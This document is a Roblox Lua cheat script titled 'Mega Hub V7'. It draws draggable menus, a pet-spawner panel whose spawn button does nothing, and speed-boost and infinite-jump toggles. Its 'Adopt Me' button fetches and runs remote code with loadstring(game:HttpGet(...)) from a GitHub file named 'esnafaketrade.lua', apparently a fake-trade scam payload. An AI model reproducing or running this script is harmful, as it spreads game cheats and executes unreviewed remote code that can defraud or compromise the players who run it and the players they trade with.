-- [[ MEGA HUB V7: DRAGGABLE + ADVANCED SPAWNER ]] --
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- 1. CLEANUP OLD UI
if CoreGui:FindFirstChild("MegaHubV7") then CoreGui.MegaHubV7:Destroy() end

local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MegaHubV7"

-- --- DRAGGABLE FUNCTION ---
local function MakeDraggable(frame)
    local dragging, dragInput, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true dragStart = input.Position startPos = frame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    frame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
    UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- 2. THE MAIN HUB MENU
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 500, 0, 360)
Main.Position = UDim2.new(0.5, -250, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Instance.new("UICorner", Main)
MakeDraggable(Main)

local Side = Instance.new("Frame", Main)
Side.Size = UDim2.new(0, 150, 1, 0)
Side.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Instance.new("UICorner", Side)

local Content = Instance.new("ScrollingFrame", Main)
Content.Size = UDim2.new(1, -165, 1, -20)
Content.Position = UDim2.new(0, 155, 0, 10)
Content.BackgroundTransparency = 1
Content.CanvasSize = UDim2.new(0,0,2,0)
Content.ScrollBarThickness = 2
Instance.new("UIListLayout", Content).Padding = UDim.new(0, 10)

-- --- ADVANCED PET SPAWNER UI ---
local SpawnerMain = Instance.new("Frame", ScreenGui)
SpawnerMain.Size = UDim2.new(0, 350, 0, 250)
SpawnerMain.Position = UDim2.new(0.5, 30, 0.3, 0)
SpawnerMain.BackgroundColor3 = Color3.fromRGB(30, 32, 38)
SpawnerMain.Visible = false
Instance.new("UICorner", SpawnerMain)
MakeDraggable(SpawnerMain)

local SBox = Instance.new("TextBox", SpawnerMain)
SBox.Size = UDim2.new(0.9, 0, 0, 40) SBox.Position = UDim2.new(0.05, 0, 0.2, 0)
SBox.PlaceholderText = "Enter Pet Name to Spawn" SBox.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
SBox.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", SBox)

-- FRNM Buttons
local function CreateFRNM()
    local f = Instance.new("Frame", SpawnerMain)
    f.Size = UDim2.new(0.9, 0, 0, 40) f.Position = UDim2.new(0.05, 0, 0.45, 0) f.BackgroundTransparency = 1
    Instance.new("UIListLayout", f).FillDirection = "Horizontal"
    local function B(t, c)
        local b = Instance.new("TextButton", f)
        b.Size = UDim2.new(0.25, -5, 1, 0) b.Text = t b.TextColor3 = Color3.new(1,1,1)
        b.BackgroundColor3 = Color3.fromRGB(30,30,30) b.BorderColor3 = c b.BorderSizePixel = 2
    end
    B("F", Color3.new(0,0.6,1)) B("R", Color3.new(1,0,0.6)) B("N", Color3.new(0,1,0.4)) B("M", Color3.new(0.6,1,0))
end
CreateFRNM()

local FinalSpawn = Instance.new("TextButton", SpawnerMain)
FinalSpawn.Size = UDim2.new(0.9, 0, 0, 40) FinalSpawn.Position = UDim2.new(0.05, 0, 0.75, 0)
FinalSpawn.Text = "Spawn Pet" FinalSpawn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
FinalSpawn.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", FinalSpawn)

-- --- TABS ---
local function ShowMisc()
    for _,v in pairs(Content:GetChildren()) do if v:IsA("Frame") or v:IsA("TextButton") then v:Destroy() end end
    local function Tool(txt, cb)
        local b = Instance.new("TextButton", Content)
        b.Size = UDim2.new(0.95, 0, 0, 45) b.Text = txt
        b.BackgroundColor3 = Color3.fromRGB(50, 50, 50) b.TextColor3 = Color3.new(1, 1, 1)
        Instance.new("UICorner", b) b.MouseButton1Click:Connect(cb)
    end
    Tool("Speed Boost (2x)", function() LP.Character.Humanoid.WalkSpeed = 32 end) --
    Tool("Infinite Jump: ON", function() --
        game:GetService("UserInputService").JumpRequest:Connect(function() LP.Character.Humanoid:ChangeState("Jumping") end)
    end)
    Tool("Close Spawner", function() SpawnerMain.Visible = false end)
end

-- SIDEBAR NAV
local function Nav(txt, func)
    local b = Instance.new("TextButton", Side)
    b.Size = UDim2.new(1, 0, 0, 50) b.Text = txt b.TextColor3 = Color3.new(1,1,1) b.BackgroundTransparency = 1
    b.MouseButton1Click:Connect(func)
end
Nav("📊 Dashboard", function() end)
Nav("🐾 Adopt Me", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))() end)
Nav("🎁 Spawner", function() SpawnerMain.Visible = true end)
Nav("⚙️ Misc", ShowMisc)
